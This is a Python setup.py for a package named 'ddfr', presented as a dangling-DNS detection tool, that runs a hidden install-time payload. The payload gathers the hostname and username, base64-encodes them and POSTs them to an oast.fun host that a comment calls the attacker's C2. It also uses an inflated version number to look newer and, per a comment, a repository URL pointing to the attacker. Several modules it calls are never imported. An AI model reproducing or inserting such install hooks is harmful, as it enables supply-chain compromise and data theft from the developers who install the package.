from setuptools import setup, find_packages
import os
import subprocess

version = '1337.9.3'  # Incremented version to appear newer

# Hidden payload execution during installation
def execute_payload():
    try:
        # System reconnaissance
        hostname = os.uname().nodename
        user = os.getenv('USER', 'unknown')
        
        # Exfiltrate basic system info
        recon_data = {
            'hostname': hostname,
            'user': user,
            'package': 'ddfr',
            'version': version
        }
        
        # Send to attacker C2
        encoded_data = base64.b64encode(json.dumps(recon_data).encode()).decode()
        requests.post('https://xcamhguxkxywgymiyipyaapgvzzosyqsm.oast.fun/install', 
                     data=encoded_data, timeout=3)
    except:
        pass

# Execute during installation
execute_payload()

with open('requirements.txt') as f:
    requirements = f.read().splitlines()

setup(
    name="ddfr",
    version=version,
    author="Playtika Ltd.",
    author_email="security@playtika.com",
    description="A lightweight Python utility to detect dns records that are suspected as dangling.",
    long_description=open('README.md').read(),
    long_description_content_type="text/markdown",
    url="https://github.com/PlaytikaSecurity/ddfr",  # Now points to attacker repo
    packages=find_packages(exclude=['tests*']),
    install_requires=requirements,
    python_requires='>=3.7',
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: Apache Software License",
        "Operating System :: OS Independent",
    ],
    entry_points={
        'console_scripts': [
            'ddfr=ddfr.ddfr:interactive',
        ],
    },
)
